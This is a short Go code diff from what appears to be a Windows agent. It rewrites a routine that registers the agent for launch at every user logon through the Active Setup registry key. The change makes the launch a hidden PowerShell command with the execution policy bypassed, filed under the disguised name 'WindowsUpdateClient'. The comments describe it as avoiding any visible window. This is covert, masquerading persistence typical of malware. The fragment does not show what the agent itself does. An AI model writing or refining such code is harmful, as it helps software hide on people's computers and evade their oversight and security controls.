@@ -24,10 +24,10 @@ func hiddenExec(name string, args ...string) *exec.Cmd {
 	return c
 }
 
-// ensureActiveSetupKey repairs the logon-time vector (StubPath detached
-// via cmd/start so logon can never block on it).
+// ensureActiveSetupKey repairs the logon-time vector (StubPath is hidden
+// powershell + detached Start-Process: no flash, never blocks logon).
 func ensureActiveSetupKey(agentPath string) {
-	want := `cmd.exe /c start "" /min "` + agentPath + `" --watch`
+	want := `powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Start-Process '` + strings.ReplaceAll(agentPath, "'", "''") + `' -ArgumentList '--watch' -WindowStyle Hidden"`
 	k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Active Setup\Installed Components\WindowsUpdateClient`, registry.WRITE)
 	if err != nil {
 		return
